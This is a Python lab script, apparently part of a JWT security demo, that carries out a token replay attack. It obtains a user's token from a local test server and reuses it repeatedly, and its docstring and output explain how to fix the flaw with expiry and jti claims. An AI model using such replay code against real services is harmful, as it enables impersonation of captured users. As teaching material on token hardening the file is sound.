"""
attack_replay.py — Token Replay Attack
========================================
MITRE ATT&CK: T1550.001 — Use Alternate Authentication Material

HOW IT WORKS:
  A JWT is stateless — once issued, the server trusts it until it expires.
  If the server does NOT set an expiry (exp) claim, the token is valid forever.
  If the server does NOT track used tokens (no jti / blacklist), a token
  captured once can be replayed indefinitely.

  Replay scenario:
    1. Attacker sniffs a valid token from network traffic, a stolen log,
       a leaked env file, or shoulder-surfing a JWT debugging tool.
    2. Attacker reuses that token hours/days later — it still works.

  This is especially dangerous for:
    - Admin tokens that never rotate
    - Tokens issued at login with no short TTL
    - APIs with no revocation endpoint

FIX (what hardened_app.py should also do, beyond algorithm pinning):
    payload = {
        "user": username,
        "role": user["role"],
        "iat": int(time.time()),            # issued at
        "exp": int(time.time()) + 3600,     # expires in 1 hour
        "jti": str(uuid.uuid4()),           # unique token ID (for blacklist)
    }

DEMO OUTCOME:
  - Token replayed 5 times → all HTTP 200 (server accepts every time)
  - Demonstrates the vulnerable server has no exp / jti protection
"""

import requests
import time

TARGET = "http://10.236.147.152:5000"   # vulnerable server — change if needed

REPLAY_COUNT = 5   # how many times to reuse the same token


def banner():
    print("=" * 65)
    print("  TOKEN REPLAY ATTACK")
    print("  MITRE ATT&CK: T1550.001 — Use Alternate Authentication Material")
    print(f"  Target: {TARGET}")
    print("=" * 65)


def run():
    banner()

    # Step 1 — obtain a legitimate alice token (simulates sniffing one valid response)
    print("\n[1] Obtaining a legitimate token for alice (simulates interception)...")
    try:
        r = requests.post(
            f"{TARGET}/login",
            json={"username": "alice", "password": "pass123"},
            timeout=4,
        )
    except requests.exceptions.ConnectionError:
        print(f"  [ERR] Cannot reach {TARGET} — is the server running?")
        return

    if r.status_code != 200:
        print(f"  [ERR] Login failed: HTTP {r.status_code} — {r.json()}")
        return

    token = r.json()["token"]
    print(f"  Token captured: {token[:60]}...")
    print(f"  (alice is a low-privilege USER — role=user in this token)")

    # Step 2 — replay the same token multiple times
    print(f"\n[2] Replaying the same token {REPLAY_COUNT} times against /profile...")
    print("  (no exp claim means it never expires; no jti means no one-time check)\n")

    for i in range(1, REPLAY_COUNT + 1):
        try:
            resp = requests.get(
                f"{TARGET}/profile",
                headers={"Authorization": f"Bearer {token}"},
                timeout=4,
            )
            status = resp.status_code
            body   = resp.json()
            tag = "[ACCEPTED]" if status == 200 else "[REJECTED]"
            print(f"  Replay #{i}: HTTP {status} {tag}  →  {body}")
        except requests.exceptions.ConnectionError:
            print(f"  Replay #{i}: [ERR] Connection lost")
            break
        time.sleep(0.3)   # small delay so output is readable

    print()
    print("  RESULT: All replays accepted — token has no expiry and no")
    print("  one-time-use enforcement. An attacker who captures this token")
    print("  once can impersonate alice indefinitely.")
    print()
    print("  FIX: Add exp (e.g., +3600s) and jti to every issued token.")
    print("       Maintain a server-side jti blacklist or short TTL rotation.")
    print()


if __name__ == "__main__":
    run()
